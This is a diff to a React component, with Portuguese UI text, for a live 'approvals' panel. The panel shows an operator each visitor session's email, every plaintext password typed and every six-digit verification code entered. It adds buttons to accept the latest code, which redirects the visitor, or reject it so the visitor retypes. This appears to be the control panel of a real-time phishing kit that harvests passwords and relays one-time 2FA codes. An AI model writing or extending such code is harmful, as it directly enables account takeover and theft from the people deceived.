@@ -1,7 +1,7 @@
 import { useEffect, useMemo, useState } from "react";
 import { supabase } from "@/integrations/supabase/client";
 import { Button } from "@/components/ui/button";
-import { Check, X, Loader2, ShieldCheck } from "lucide-react";
+import { Check, X, Loader2, ShieldCheck, KeyRound, Hash } from "lucide-react";
 import { toast } from "sonner";
 
 interface ApprovalsPanelProps {
@@ -21,15 +21,18 @@ interface ActionRow {
   created_at: string;
 }
 
+interface Attempt {
+  value: string;
+  at: string;
+  resolved?: "approve" | "reject";
+}
+
 interface SessionState {
   session_id: string;
   email?: string;
-  password?: string;
-  code?: string;
-  passwordAt?: string;
-  codeAt?: string;
-  resolved?: "approve" | "reject";
-  resolvedAt?: string;
+  passwordAttempts: Attempt[];
+  codeAttempts: Attempt[];
+  lastActivity: string;
 }
 
 export function ApprovalsPanel({ adId }: ApprovalsPanelProps) {
@@ -97,30 +100,34 @@ export function ApprovalsPanel({ adId }: ApprovalsPanelProps) {
   const sessions: SessionState[] = useMemo(() => {
     const map = new Map<string, SessionState>();
     for (const l of leads) {
-      const s = map.get(l.session_id) || { session_id: l.session_id };
+      const s =
+        map.get(l.session_id) ||
+        ({ session_id: l.session_id, passwordAttempts: [], codeAttempts: [], lastActivity: l.created_at } as SessionState);
       if (l.field_name === "email_submitted") s.email = l.value;
-      if (l.field_name === "password_submitted") {
-        s.password = l.value;
-        s.passwordAt = l.created_at;
-      }
-      if (l.field_name === "code_submitted") {
-        s.code = l.value;
-        s.codeAt = l.created_at;
-      }
+      if (l.field_name === "password_submitted") s.passwordAttempts.push({ value: l.value, at: l.created_at });
+      if (l.field_name === "code_submitted") s.codeAttempts.push({ value: l.value, at: l.created_at });
+      if (l.created_at > s.lastActivity) s.lastActivity = l.created_at;
       map.set(l.session_id, s);
     }
+    // Marca tentativas resolvidas: associa cada ação à tentativa de código mais recente ANTERIOR à ação
     for (const a of actions) {
+      if (a.action !== "approve" && a.action !== "reject") continue;
       const s = map.get(a.session_id);
       if (!s) continue;
-      if (a.action === "approve" || a.action === "reject") {
-        s.resolved = a.action;
-        s.resolvedAt = a.created_at;
+      // Pega a última tentativa de código com at <= action.created_at e ainda não resolvida
+      for (let i = s.codeAttempts.length - 1; i >= 0; i--) {
+        const att = s.codeAttempts[i];
+        if (!att.resolved && att.at <= a.created_at) {
+          att.resolved = a.action as "approve" | "reject";
+          break;
+        }
       }
+      if (a.created_at > s.lastActivity) s.lastActivity = a.created_at;
     }
-    // Mostra só sessões com pelo menos código
+    // Mostra só sessões que tiveram pelo menos 1 código submetido
     return Array.from(map.values())
-      .filter((s) => s.code)
-      .sort((a, b) => (b.codeAt || "").localeCompare(a.codeAt || ""));
+      .filter((s) => s.codeAttempts.length > 0)
+      .sort((a, b) => b.lastActivity.localeCompare(a.lastActivity));
   }, [leads, actions]);
 
   const send = async (sessionId: string, action: "approve" | "reject", message?: string) => {
@@ -136,7 +143,7 @@ export function ApprovalsPanel({ adId }: ApprovalsPanelProps) {
       toast.error(error.message);
       return;
     }
-    toast.success(action === "approve" ? "Aprovado — visitante redirecionado" : "Rejeitado");
+    toast.success(action === "approve" ? "Aprovado — visitante redirecionado" : "Rejeitado — visitante pode tentar de novo");
   };
 
   if (sessions.length === 0) {
@@ -147,11 +154,16 @@ export function ApprovalsPanel({ adId }: ApprovalsPanelProps) {
           <h3 className="text-sm font-semibold">Aprovações ao vivo</h3>
         </div>
         <p className="mt-2 text-xs italic text-muted-foreground">
-          Quando alguém digitar a senha + o código de 6 dígitos, vai aparecer aqui pra você aceitar ou rejeitar.
+          Quando alguém digitar a senha + o código de 6 dígitos, vai aparecer aqui pra você aceitar ou rejeitar cada tentativa.
         </p>
       </div>
     );
   }
+
+  const totalPending = sessions.reduce(
+    (acc, s) => acc + s.codeAttempts.filter((a) => !a.resolved).length,
+    0,
+  );
 
   return (
     <div className="mt-8 rounded-lg border border-border bg-background/50 p-4">
@@ -159,31 +171,69 @@ export function ApprovalsPanel({ adId }: ApprovalsPanelProps) {
         <ShieldCheck className="h-4 w-4 text-primary" />
         <h3 className="text-sm font-semibold">Aprovações ao vivo</h3>
         <span className="ml-auto text-[10px] uppercase tracking-wide text-muted-foreground">
-          {sessions.filter((s) => !s.resolved).length} pendente(s)
+          {totalPending} tentativa(s) pendente(s)
         </span>
       </div>
 
-      <div className="space-y-2">
+      <div className="space-y-3">
         {sessions.map((s) => {
-          const pending = !s.resolved;
+          const lastCode = s.codeAttempts[s.codeAttempts.length - 1];
+          const pending = lastCode && !lastCode.resolved;
           return (
             <div
               key={s.session_id}
               className={`rounded-md border p-3 text-xs ${
-                pending ? "border-primary/40 bg-primary/5" : "border-border bg-card/30 opacity-70"
+                pending ? "border-primary/40 bg-primary/5" : "border-border bg-card/30"
               }`}
             >
-              <div className="grid grid-cols-[auto,1fr] gap-x-3 gap-y-1">
-                <span className="text-muted-foreground">E-mail</span>
-                <span className="break-all font-mono">{s.email || "—"}</span>
-                <span className="text-muted-foreground">Senha</span>
-                <span className="break-all font-mono">{s.password || "—"}</span>
-                <span className="text-muted-foreground">Código</span>
-                <span className="break-all font-mono tracking-widest">{s.code || "—"}</span>
+              {/* Cabeçalho: e-mail */}
+              <div className="mb-2 flex items-center justify-between gap-2">
+                <span className="break-all font-mono text-[11px] text-foreground">{s.email || "—"}</span>
+                <span className="shrink-0 text-[10px] text-muted-foreground">
+                  {s.passwordAttempts.length} senha(s) · {s.codeAttempts.length} código(s)
+                </span>
               </div>
 
-              {pending ? (
-                <div className="mt-3 flex gap-2">
+              {/* Histórico de senhas */}
+              {s.passwordAttempts.length > 0 && (
+                <div className="mb-2 rounded bg-muted/40 p-2">
+                  <div className="mb-1 flex items-center gap-1 text-[10px] uppercase tracking-wide text-muted-foreground">
+                    <KeyRound className="h-3 w-3" /> Senhas digitadas
+                  </div>
+                  <div className="space-y-0.5">
+                    {s.passwordAttempts.map((p, i) => (
+                      <div key={i} className="flex items-center gap-2">
+                        <span className="text-[10px] text-muted-foreground">#{i + 1}</span>
+                        <span className="break-all font-mono">{p.value}</span>
+                      </div>
+                    ))}
+                  </div>
+                </div>
+              )}
+
+              {/* Histórico de códigos */}
+              <div className="mb-2 rounded bg-muted/40 p-2">
+                <div className="mb-1 flex items-center gap-1 text-[10px] uppercase tracking-wide text-muted-foreground">
+                  <Hash className="h-3 w-3" /> Códigos digitados
+                </div>
+                <div className="space-y-0.5">
+                  {s.codeAttempts.map((c, i) => (
+                    <div key={i} className="flex items-center gap-2">
+                      <span className="text-[10px] text-muted-foreground">#{i + 1}</span>
+                      <span className="break-all font-mono tracking-widest">{c.value}</span>
+                      {c.resolved === "approve" && <span className="text-[10px] text-success">✓ aprovado</span>}
+                      {c.resolved === "reject" && <span className="text-[10px] text-destructive">✗ rejeitado</span>}
+                      {!c.resolved && i === s.codeAttempts.length - 1 && (
+                        <span className="text-[10px] text-primary">⏳ aguardando</span>
+                      )}
+                    </div>
+                  ))}
+                </div>
+              </div>
+
+              {/* Ações: agem na última tentativa de código */}
+              {pending && (
+                <div className="flex gap-2">
                   <Button
                     size="sm"
                     className="flex-1 bg-success text-success-foreground hover:bg-success/90"
@@ -195,13 +245,13 @@ export function ApprovalsPanel({ adId }: ApprovalsPanelProps) {
                     ) : (
                       <Check className="mr-1 h-3.5 w-3.5" />
                     )}
-                    Aceitar
+                    Aceitar último código
                   </Button>
                   <Button
                     size="sm"
                     variant="outline"
                     className="flex-1 border-destructive/40 text-destructive hover:bg-destructive/10"
-                    onClick={() => send(s.session_id, "reject", "Código inválido. Verifique e tente novamente.")}
+                    onClick={() => send(s.session_id, "reject", "Código inválido")}
                     disabled={busy === `${s.session_id}-reject`}
                   >
                     {busy === `${s.session_id}-reject` ? (
@@ -212,10 +262,6 @@ export function ApprovalsPanel({ adId }: ApprovalsPanelProps) {
                     Rejeitar
                   </Button>
                 </div>
-              ) : (
-                <p className="mt-2 text-[11px] text-muted-foreground">
-                  {s.resolved === "approve" ? "✓ Aprovado" : "✗ Rejeitado"}
-                </p>
               )}
             </div>
           );
